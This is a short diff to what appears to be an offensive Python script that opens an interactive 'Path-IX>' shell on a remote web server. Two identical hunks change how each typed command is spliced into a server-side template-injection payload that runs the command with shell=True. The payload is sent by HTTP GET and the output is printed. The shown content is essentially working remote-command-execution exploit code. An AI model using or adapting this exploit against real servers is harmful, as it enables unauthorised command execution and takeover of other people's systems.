@@ -124,7 +124,7 @@ print("[+] Spawning Shell...")
 while True:
 	try:
 		command = input("Path-IX> ")
-		shell = challenge[:-2] + "('" + command + "', shell=True, stdout=-1).communicate()[0].decode('utf-8').strip()}}"
+		shell = challenge[:-2] + "('%s', shell=True, stdout=-1).communicate()[0].decode('utf-8').strip()}}" %command
 		r = requests.get(shell)
 		print("----------\n"+r.text[38:-30]+"\n----------")
 	except KeyboardInterrupt:
@@ -163,7 +163,7 @@ print("[+] Spawning Shell...")
 while True:
 	try:
 		command = input("Path-IX> ")
-		shell = challenge[:-2] + "('" + command + "', shell=True, stdout=-1).communicate()[0].decode('utf-8').strip()}}"
+		shell = challenge[:-2] + "('%s', shell=True, stdout=-1).communicate()[0].decode('utf-8').strip()}}" %command
 		r = requests.get(shell)
 		print("----------\n"+r.text[38:-30]+"\n----------")
 	except KeyboardInterrupt:
